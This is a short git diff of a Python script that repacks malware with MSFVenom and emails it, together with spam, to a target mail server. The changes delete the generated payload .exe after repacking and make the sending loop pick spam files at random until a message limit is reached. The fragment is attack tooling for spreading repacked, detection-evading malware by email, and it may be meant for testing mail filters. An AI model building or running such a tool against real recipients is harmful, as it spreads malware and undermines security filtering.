@@ -118,6 +118,9 @@ def malware_refresh(tg_api_key, tg_domain, malware_count):
         except Exception as e:
             print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + str(e))
 
+        os.remove(payloadname + '.exe')
+
+
 def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
      message = MIMEMultipart()
      message["From"] = sender
@@ -145,7 +148,8 @@ def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
 def fire(msg_limit):
     msg_count = 1
     failed_count = 0
-    for spam in os.listdir(spam_folder):
+    while msg_count < msg_limit:
+        spam = random.choice(os.listdir(spam_folder + '/'))
         with open(spam_folder + '/' + spam, encoding = "ISO-8859-1") as m:
             try:
                 lines = m.readlines()
